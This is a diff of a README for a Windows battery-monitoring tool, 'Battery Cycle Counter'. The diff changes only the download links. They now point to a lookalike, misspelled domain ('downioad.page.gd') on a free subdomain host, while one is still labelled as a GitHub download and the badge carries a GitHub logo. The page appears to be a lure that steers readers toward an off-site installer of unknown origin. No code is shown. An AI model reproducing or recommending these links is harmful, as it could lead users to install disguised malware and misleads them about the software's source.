@@ -2,7 +2,7 @@
 
 Battery Cycle Counter is a lightweight and efficient tool designed for Windows users to keep track of their laptop's battery cycles and health. With the latest version in 2026, it provides accurate readings and a user-friendly interface to help you optimize battery usage and prolong its lifespan. Whether you're a casual user or a tech enthusiast, this tool offers valuable insights into your battery's condition.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -64,7 +64,7 @@ Once installed, open Battery Cycle Counter from your desktop shortcut or start m
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
